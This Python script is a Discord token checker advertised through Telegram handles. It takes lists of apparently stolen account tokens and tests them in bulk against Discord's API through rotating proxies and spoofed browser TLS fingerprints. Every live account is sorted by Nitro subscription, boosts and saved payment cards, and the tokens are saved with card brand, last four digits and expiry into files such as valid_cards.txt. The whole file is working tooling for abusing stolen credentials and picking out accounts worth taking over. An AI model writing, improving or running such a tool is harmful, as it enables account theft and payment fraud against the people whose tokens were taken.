import ctypes
import time
import random
import concurrent.futures
import platform
import threading
import os
from itertools import cycle
from colorama import init, Fore, Style
from datetime import datetime, timezone
import tls_client

init()

if platform.system() == "Windows":
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Discord Token Checker @badykarma")
    except:
        pass
else:
    print("\033]0;Discord Token Checker https://t.me/cheaprip\007", end="", flush=True)

THREADS = 100
MAX_RETRIES = 3
RETRY_DELAY = 1
CHECK_MODE = "full"

stats_lock = threading.Lock()
stats = {
    "checked": 0,
    "valid": 0,
    "nitro_active": 0,
    "nitro_had": 0,
    "never": 0,
    "invalid": 0,
    "locked": 0,
    "ratelimited": 0,
    "errors": 0,
    "boost0": 0,
    "boost1": 0,
    "boost2": 0,
}

proxies = []
proxy_index = 0
proxy_lock = threading.Lock()
file_lock = threading.Lock()

class UltraBeautifulLogger:
    def __init__(self):
        self.lock = threading.Lock()
        self.log_counter = 0
        self.start_time = time.time()

    def _get_timestamp(self):
        return datetime.now().strftime("%H:%M:%S.%f")[:-3]

    def _get_runtime(self):
        runtime = time.time() - self.start_time
        return f"{runtime:.1f}s"

    def _format_thread_name(self, max_len=12):
        thread_name = threading.current_thread().name
        if "ThreadPoolExecutor" in thread_name:
            thread_name = "Worker-" + thread_name.split("_")[-1]
        if len(thread_name) > max_len:
            return thread_name[:max_len-1] + "…"
        return thread_name.ljust(max_len)

    def _create_gradient_line(self, length=90):
        colors = [Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTBLUE_EX]
        chars = ['▰', '▱', '▰', '▱']
        gradient_line = ""
        color_cycle = cycle(colors)
        char_cycle = cycle(chars)
        for i in range(length):
            if i % 15 == 0:
                current_color = next(color_cycle)
            gradient_line += f"{current_color}{next(char_cycle)}"
        return gradient_line + Style.RESET_ALL

    def _log(self, level, icon, color, message):
        with self.lock:
            timestamp = self._get_timestamp()
            runtime = self._get_runtime()
            thread_name = self._format_thread_name()
            log_entry = (
                f"{Fore.LIGHTBLACK_EX}╭─{Style.RESET_ALL} "
                f"{Fore.LIGHTCYAN_EX}⏰ {timestamp}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}│{Style.RESET_ALL} "
                f"{color}{icon} {level:<8}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}│{Style.RESET_ALL} "
                f"{Fore.LIGHTMAGENTA_EX}🧵 {thread_name}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}│{Style.RESET_ALL} "
                f"{Fore.LIGHTGREEN_EX}⚡ {runtime}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}╰─▶{Style.RESET_ALL} "
                f"{color}{message}{Style.RESET_ALL}"
            )
            print(log_entry)
            self.log_counter += 1

    def debug(self, msg): self._log('DEBUG', '🔬', Fore.LIGHTBLUE_EX, msg)
    def info(self, msg): self._log('INFO', '💫', Fore.WHITE, msg)
    def success(self, msg): self._log('SUCCESS', '🎯', Fore.LIGHTGREEN_EX, msg)
    def warning(self, msg): self._log('WARNING', '⚠️', Fore.LIGHTYELLOW_EX, msg)
    def error(self, msg): self._log('ERROR', '🔥', Fore.LIGHTRED_EX, msg)
    def nitro(self, msg): self._log('NITRO', '💎', Fore.LIGHTMAGENTA_EX, msg)
    def card(self, msg): self._log('CARD', '💳', Fore.LIGHTGREEN_EX, msg)

    def print_stats_header(self):
        if self.log_counter % 30 == 0 and self.log_counter > 0:
            with stats_lock:
                s = stats.copy()
            gradient_line = self._create_gradient_line()
            total = s['checked']
            had_nitro = s['nitro_active'] + s['nitro_had']
            hit_rate = (had_nitro / total * 100) if total > 0 else 0
            print(f"\n{gradient_line}")
            if CHECK_MODE == "nitro_only":
                print(f"{Fore.LIGHTCYAN_EX}{Style.BRIGHT}{'✨ NITRO CHECKER LIVE STATUS ✨':^90}{Style.RESET_ALL}")
            else:
                print(f"{Fore.LIGHTCYAN_EX}{Style.BRIGHT}{'✨ TOKEN CHECKER LIVE STATUS ✨':^90}{Style.RESET_ALL}")
            print(f"{Fore.LIGHTBLACK_EX}{'─' * 90}{Style.RESET_ALL}")
            if CHECK_MODE == "nitro_only":
                stats_display = f"""
{Fore.LIGHTMAGENTA_EX}💎 NITRO ACTIVE     {Fore.WHITE}│ {Fore.LIGHTMAGENTA_EX}{Style.BRIGHT}{s['nitro_active']:>6}{Style.RESET_ALL} {Fore.LIGHTMAGENTA_EX}{'█' * min(20, s['nitro_active'])}{Style.RESET_ALL}
{Fore.LIGHTYELLOW_EX}⏳ HAD NITRO        {Fore.WHITE}│ {Fore.LIGHTYELLOW_EX}{Style.BRIGHT}{s['nitro_had']:>6}{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{'█' * min(20, s['nitro_had'])}{Style.RESET_ALL}
{Fore.LIGHTBLACK_EX}○ NEVER HAD        {Fore.WHITE}│ {Fore.LIGHTBLACK_EX}{Style.BRIGHT}{s['never']:>6}{Style.RESET_ALL}
{Fore.LIGHTRED_EX}✗ INVALID          {Fore.WHITE}│ {Fore.LIGHTRED_EX}{Style.BRIGHT}{s['invalid']:>6}{Style.RESET_ALL}
{Fore.LIGHTBLACK_EX}{'─' * 90}{Style.RESET_ALL}
{Fore.LIGHTCYAN_EX}📊 TOTAL CHECKED    {Fore.WHITE}│ {Fore.WHITE}{Style.BRIGHT}{s['checked']:>6}{Style.RESET_ALL}
{Fore.LIGHTCYAN_EX}🎯 NITRO HIT RATE   {Fore.WHITE}│ {Fore.LIGHTGREEN_EX if hit_rate > 10 else Fore.LIGHTYELLOW_EX if hit_rate > 5 else Fore.LIGHTRED_EX}{Style.BRIGHT}{hit_rate:>5.1f}%{Style.RESET_ALL}
{Fore.LIGHTCYAN_EX}⚡ RUNTIME          {Fore.WHITE}│ {Fore.LIGHTCYAN_EX}{Style.BRIGHT}{self._get_runtime():>6}{Style.RESET_ALL}"""
            else:
                valid_rate = (s['valid'] / total * 100) if total > 0 else 0
                stats_display = f"""
{Fore.LIGHTGREEN_EX}💳 VALID CARDS      {Fore.WHITE}│ {Fore.LIGHTGREEN_EX}{Style.BRIGHT}{s['valid']:>6}{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}{'█' * min(20, s['valid'])}{Style.RESET_ALL}
{Fore.LIGHTMAGENTA_EX}💎 NITRO ACTIVE     {Fore.WHITE}│ {Fore.LIGHTMAGENTA_EX}{Style.BRIGHT}{s['nitro_active']:>6}{Style.RESET_ALL} {Fore.LIGHTMAGENTA_EX}{'█' * min(20, s['nitro_active'])}{Style.RESET_ALL}
{Fore.LIGHTYELLOW_EX}⏳ HAD NITRO        {Fore.WHITE}│ {Fore.LIGHTYELLOW_EX}{Style.BRIGHT}{s['nitro_had']:>6}{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{'█' * min(20, s['nitro_had'])}{Style.RESET_ALL}
{Fore.LIGHTBLACK_EX}○ NEVER HAD        {Fore.WHITE}│ {Fore.LIGHTBLACK_EX}{Style.BRIGHT}{s['never']:>6}{Style.RESET_ALL}
{Fore.LIGHTRED_EX}✗ INVALID          {Fore.WHITE}│ {Fore.LIGHTRED_EX}{Style.BRIGHT}{s['invalid']:>6}{Style.RESET_ALL}
{Fore.LIGHTBLACK_EX}{'─' * 90}{Style.RESET_ALL}
{Fore.LIGHTCYAN_EX}📊 TOTAL CHECKED    {Fore.WHITE}│ {Fore.WHITE}{Style.BRIGHT}{s['checked']:>6}{Style.RESET_ALL}
{Fore.LIGHTCYAN_EX}🎯 VALID CARD RATE  {Fore.WHITE}│ {Fore.LIGHTGREEN_EX if valid_rate > 10 else Fore.LIGHTYELLOW_EX if valid_rate > 5 else Fore.LIGHTRED_EX}{Style.BRIGHT}{valid_rate:>5.1f}%{Style.RESET_ALL}
{Fore.LIGHTCYAN_EX}⚡ RUNTIME          {Fore.WHITE}│ {Fore.LIGHTCYAN_EX}{Style.BRIGHT}{self._get_runtime():>6}{Style.RESET_ALL}"""
            print(stats_display)
            print(f"{gradient_line}\n")

    def print_startup_banner(self):
        gradient = self._create_gradient_line()
        banner = f"""
{gradient}
{Fore.LIGHTCYAN_EX}{Style.BRIGHT}
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                              ║
    ║   ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ██████╗██╗  ██╗██╗  ██╗   ║
    ║   ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝██║  ██║██║ ██╔╝   ║
    ║      ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║     ███████║█████╔╝    ║
    ║      ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║     ██╔══██║██╔═██╗    ║
    ║      ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚██████╗██║  ██║██║  ██╗   ║
    ║      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝   ║
    ║                                                                              ║
    ║                      ⚡ Contact: t.me/badykarma ⚡                       ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
{gradient}
"""
        print(banner)

logger = UltraBeautifulLogger()

def increment_stat(key):
    with stats_lock:
        stats[key] += 1

def save(filename, content):
    os.makedirs("output", exist_ok=True)
    with file_lock:
        with open(f"output/{filename}", 'a', encoding='utf-8') as f:
            f.write(content + '\n')

def format_display(line):
    parts = line.strip().split(":")
    token = parts[-1]
    if len(parts) >= 3 and "@" in parts[0]:
        email = parts[0]
        local, domain = email.split("@", 1)
        masked = f"{local[:2]}***@{domain}"
        return f"{masked} | {token[:12]}..."
    if len(token) > 24:
        return f"{token[:18]}...{token[-6:]}"
    return token

def extract_token(line):
    return line.strip().split(":")[-1].strip()

def load_proxies(filename="proxies.txt"):
    global proxies
    try:
        with open(filename, "r", encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        for line in lines:
            proxy = format_proxy(line)
            if proxy:
                proxies.append(proxy)
        return len(proxies)
    except FileNotFoundError:
        return 0
    except Exception as e:
        logger.error(f"Error loading proxies: {str(e)}")
        return 0

def format_proxy(proxy_string):
    proxy_string = proxy_string.strip()
    if "://" in proxy_string:
        return proxy_string
    if "@" in proxy_string:
        return f"http://{proxy_string}"
    parts = proxy_string.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def get_next_proxy():
    global proxy_index
    if not proxies:
        return None
    with proxy_lock:
        proxy = proxies[proxy_index % len(proxies)]
        proxy_index += 1
        return proxy

class TokenChecker:
    def __init__(self):
        self.sp = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1NjIzMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
        self.base_headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://discord.com/channels/@me',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-super-properties': self.sp,
        }

    def make_request(self, url, headers, max_retries=MAX_RETRIES):
        for attempt in range(max_retries):
            proxy = get_next_proxy()
            if attempt > 0:
                time.sleep(random.uniform(0.1, 0.3))
            try:
                session = tls_client.Session(
                    client_identifier="chrome120",
                    random_tls_extension_order=True
                )
                if proxy:
                    session.proxies = {"http": proxy, "https": proxy}
                response = session.get(url, headers=headers, timeout_seconds=15)
                return response, None
            except Exception as e:
                error_str = str(e).lower()
                is_retryable = any(x in error_str for x in [
                    'goaway', 'protocol_error', 'connection', 'timeout',
                    'reset', 'broken pipe', 'eof', 'unexpected'
                ])
                if is_retryable and attempt < max_retries - 1:
                    delay = RETRY_DELAY * (2 ** attempt) + random.uniform(0, 0.5)
                    time.sleep(delay)
                    continue
                else:
                    return None, str(e)
        return None, "Max retries exceeded"

    def calculate_time_remaining(self, date_str):
        try:
            date = datetime.strptime(date_str.split("T")[0], '%Y-%m-%d')
            current_date = datetime.now()
            days = (date - current_date).days
            return f"{days} days"
        except:
            return "unknown"

    def check_boosts(self, token, headers):
        response, error = self.make_request(
            'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
            headers
        )
        if error or not response or response.status_code != 200:
            return 0
        try:
            js = response.json()
            boosts = sum(1 for boost in js if not boost.get("cooldown_ends_at"))
            return boosts
        except:
            return 0

    def check_nitro(self, token, headers):
        response, error = self.make_request(
            'https://discord.com/api/v9/users/@me/billing/subscriptions?include_inactive=true',
            headers
        )
        if error or not response:
            return "error", None
        if response.status_code == 401:
            return "invalid", None
        if response.status_code == 403:
            return "locked", None
        if response.status_code == 429:
            return "ratelimited", None
        if response.status_code == 200:
            try:
                subs = response.json()
                if subs:
                    for sub in subs:
                        if sub.get("status") == 1:
                            nitro_types = {1: "Classic", 2: "Nitro", 3: "Basic"}
                            nitro_type = nitro_types.get(sub.get("type"), "Nitro")
                            expires = sub.get("current_period_end", "")
                            time_left = self.calculate_time_remaining(expires) if expires else "unknown"
                            return "active", f"{nitro_type} ({time_left})"
                    most_recent = None
                    for sub in subs:
                        ended = sub.get("ended_at") or sub.get("canceled_at") or sub.get("current_period_end")
                        if ended:
                            try:
                                end_date = datetime.fromisoformat(ended.replace('Z', '+00:00'))
                                if most_recent is None or end_date > most_recent:
                                    most_recent = end_date
                            except:
                                continue
                    if most_recent:
                        now = datetime.now(timezone.utc)
                        days_ago = (now - most_recent).days
                        if days_ago < 30:
                            return "had", f"{days_ago}d ago"
                        else:
                            months_ago = days_ago // 30
                            return "had", f"{months_ago}mo ago"
                    return "had", "unknown date"
                return "never", None
            except Exception as e:
                return "error", str(e)[:30]
        return "error", f"HTTP {response.status_code}"

    def check_payment_sources(self, token, headers):
        response, error = self.make_request(
            'https://discord.com/api/v9/users/@me/billing/payment-sources',
            headers
        )
        if error or not response or response.status_code != 200:
            return []
        try:
            payments = response.json()
            results = []
            for payment in payments:
                card_info = {
                    "brand": payment.get("brand", "Unknown"),
                    "last_4": payment.get("last_4", "****"),
                    "invalid": payment.get("invalid", True),
                    "expires_month": payment.get("expires_month"),
                    "expires_year": payment.get("expires_year"),
                    "created_at": payment.get("created_at"),
                    "is_default": payment.get("default", False)
                }
                if card_info["created_at"]:
                    try:
                        created = datetime.fromisoformat(card_info["created_at"].replace('Z', '+00:00'))
                        age_days = (datetime.now(timezone.utc) - created).days
                        card_info["age_months"] = age_days // 30
                        card_info["age_years"] = age_days // 365
                    except:
                        card_info["age_months"] = None
                        card_info["age_years"] = None
                else:
                    card_info["age_months"] = None
                    card_info["age_years"] = None
                results.append(card_info)
            return results
        except:
            return []

    def check_nitro_only(self, credential):
        raw = credential.strip()
        token = extract_token(raw)
        display = format_display(raw)
        headers = self.base_headers.copy()
        headers['authorization'] = token
        status, detail = self.check_nitro(token, headers)
        increment_stat("checked")
        if status == "active":
            boosts = self.check_boosts(token, headers)
            logger.nitro(f"🏆 ACTIVE: {detail} | Boosts: {boosts} | {display}")
            save("nitro_active.txt", f"{raw} | {detail} | {boosts} boosts")
            increment_stat("nitro_active")
            increment_stat(f"boost{min(boosts, 2)}")
        elif status == "had":
            logger.nitro(f"⏳ HAD NITRO: {detail} | {display}")
            save("nitro_had.txt", f"{raw} | {detail}")
            increment_stat("nitro_had")
        elif status == "never":
            logger.info(f"🚫 Never had Nitro | {display}")
            save("nitro_never.txt", raw)
            increment_stat("never")
        elif status == "invalid":
            logger.error(f"❌ Invalid token | {display}")
            save("invalid.txt", raw)
            increment_stat("invalid")
        elif status == "locked":
            logger.warning(f"🔒 Locked token | {display}")
            save("locked.txt", raw)
            increment_stat("locked")
        elif status == "ratelimited":
            logger.warning(f"⏱️ Ratelimited | {display}")
            increment_stat("ratelimited")
        else:
            logger.error(f"⚠️ Error: {detail} | {display}")
            save("errors.txt", f"{raw} | {detail}")
            increment_stat("errors")
        logger.print_stats_header()
        return status

    def check_full(self, credential):
        raw = credential.strip()
        token = extract_token(raw)
        display = format_display(raw)
        headers = self.base_headers.copy()
        headers['authorization'] = token
        response, error = self.make_request(
            'https://discord.com/api/v9/users/@me/billing/payment-sources',
            headers
        )
        if error or not response:
            increment_stat("checked")
            logger.error(f"⚠️ Connection error | {display}")
            save("errors.txt", f"{raw} | {error}")
            increment_stat("errors")
            logger.print_stats_header()
            return "error"
        if response.status_code == 401:
            increment_stat("checked")
            logger.error(f"❌ Invalid token | {display}")
            save("invalid.txt", raw)
            increment_stat("invalid")
            logger.print_stats_header()
            return "invalid"
        if response.status_code == 403:
            increment_stat("checked")
            logger.warning(f"🔒 Locked token | {display}")
            save("locked.txt", raw)
            increment_stat("locked")
            logger.print_stats_header()
            return "locked"
        if response.status_code == 429:
            increment_stat("checked")
            logger.warning(f"⏱️ Ratelimited | {display}")
            increment_stat("ratelimited")
            logger.print_stats_header()
            return "ratelimited"
        if response.status_code == 200:
            increment_stat("checked")
            nitro_status, nitro_detail = self.check_nitro(token, headers)
            if nitro_status == "active":
                boosts = self.check_boosts(token, headers)
                logger.nitro(f"🏆 ACTIVE: {nitro_detail} | Boosts: {boosts} | {display}")
                save("nitro_active.txt", f"{raw} | {nitro_detail} | {boosts} boosts")
                increment_stat("nitro_active")
                increment_stat(f"boost{min(boosts, 2)}")
            elif nitro_status == "had":
                logger.nitro(f"⏳ HAD NITRO: {nitro_detail} | {display}")
                save("nitro_had.txt", f"{raw} | {nitro_detail}")
                increment_stat("nitro_had")
            elif nitro_status == "never":
                logger.info(f"🚫 Never had Nitro | {display}")
                save("nitro_never.txt", raw)
                increment_stat("never")
            payments = self.check_payment_sources(token, headers)
            if payments:
                valid_cards = [p for p in payments if not p["invalid"]]
                invalid_cards = [p for p in payments if p["invalid"]]
                if valid_cards:
                    for card in valid_cards:
                        brand = card["brand"]
                        last4 = card["last_4"]
                        age_info = ""
                        if card["age_years"] is not None:
                            if card["age_years"] > 0:
                                age_info = f" ({card['age_years']}y {card['age_months'] % 12}mo old)"
                            else:
                                age_info = f" ({card['age_months']}mo old)"
                        exp_info = ""
                        if card["expires_month"] and card["expires_year"]:
                            exp_info = f" Exp: {card['expires_month']}/{card['expires_year']}"
                        logger.card(f"💳 Valid: {brand} ****{last4}{age_info}{exp_info} | {display}")
                        save("valid_cards.txt", f"{raw} | {brand} ****{last4}{age_info}{exp_info}")
                    increment_stat("valid")
                if invalid_cards:
                    for card in invalid_cards:
                        logger.warning(f"⚠️ Invalid card: {card['brand']} ****{card['last_4']} | {display}")
                        save("invalid_cards.txt", f"{raw} | {card['brand']} ****{card['last_4']}")
                if not valid_cards and not invalid_cards:
                    logger.warning(f"💸 No payment methods | {display}")
                    save("no_payment.txt", raw)
            else:
                logger.warning(f"💸 No payment methods | {display}")
                save("no_payment.txt", raw)
            logger.print_stats_header()
            return "success"
        increment_stat("checked")
        logger.error(f"⚠️ HTTP {response.status_code} | {display}")
        save("errors.txt", f"{raw} | HTTP {response.status_code}")
        increment_stat("errors")
        logger.print_stats_header()
        return "error"

    def check(self, credential):
        if CHECK_MODE == "nitro_only":
            return self.check_nitro_only(credential)
        else:
            return self.check_full(credential)

checker = TokenChecker()

def main():
    global THREADS, CHECK_MODE
    os.system("cls" if os.name == "nt" else "clear")
    logger.print_startup_banner()
    logger.info("Loading proxies from 'proxies.txt'...")
    proxy_count = load_proxies("proxies.txt")
    if proxy_count > 0:
        logger.success(f"Loaded {proxy_count} proxies")
    else:
        logger.warning("No proxies loaded - running without proxies (higher ratelimit risk)")
    try:
        with open("tokens.txt", "r", encoding="utf-8") as f:
            credentials = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logger.error("tokens.txt not found!")
        return
    if not credentials:
        logger.error("No tokens found in tokens.txt")
        return
    logger.info(f"Loaded {len(credentials)} tokens")
    print(f"\n{Fore.LIGHTCYAN_EX}Select checking mode:{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTMAGENTA_EX}[1]{Style.RESET_ALL} Nitro Only - Fast check if token ever had Nitro")
    print(f"  {Fore.LIGHTMAGENTA_EX}[2]{Style.RESET_ALL} Full Check - Nitro + Payment methods + Cards")
    try:
        mode_input = input(f"\n{Fore.LIGHTCYAN_EX}Enter mode (1 or 2): {Style.RESET_ALL}").strip()
        CHECK_MODE = "nitro_only" if mode_input == "1" else "full"
    except:
        CHECK_MODE = "full"
    logger.info(f"Mode: {'Nitro Only' if CHECK_MODE == 'nitro_only' else 'Full Check'}")
    try:
        user_input = input(f"{Fore.LIGHTCYAN_EX}Enter number of threads (1-500, default {THREADS}): {Style.RESET_ALL}")
        if user_input.strip():
            THREADS = int(user_input)
    except:
        pass
    THREADS = max(1, min(THREADS, 500, len(credentials)))
    os.system("cls" if os.name == "nt" else "clear")
    logger.print_startup_banner()
    logger.info(f"Starting {CHECK_MODE.upper()} mode with {THREADS} threads...")
    print()
    start = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        list(executor.map(checker.check, credentials))
    elapsed = time.time() - start
    print()
    gradient = logger._create_gradient_line()
    print(f"\n{gradient}")
    logger.success(f"Checked {len(credentials)} tokens in {elapsed:.2f}s")
    print(f"{gradient}\n")
    with stats_lock:
        s = stats.copy()
    print(f"{Fore.LIGHTCYAN_EX}Final Stats:{Style.RESET_ALL}")
    if CHECK_MODE == "full":
        print(f"  {Fore.LIGHTGREEN_EX}💳 Valid Cards: {s['valid']}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTMAGENTA_EX}💎 Active Nitro: {s['nitro_active']}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTYELLOW_EX}⏳ Had Nitro: {s['nitro_had']}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTBLACK_EX}○ Never Had: {s['never']}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTRED_EX}✗ Invalid: {s['invalid']}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTYELLOW_EX}🔒 Locked: {s['locked']}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTBLUE_EX}⏱️ Ratelimited: {s['ratelimited']}{Style.RESET_ALL}")
    if s['nitro_active'] > 0:
        print(f"  {Fore.LIGHTGREEN_EX}Boosts: 0={s['boost0']} | 1={s['boost1']} | 2={s['boost2']}{Style.RESET_ALL}")
    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Process interrupted by user. Exiting...")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
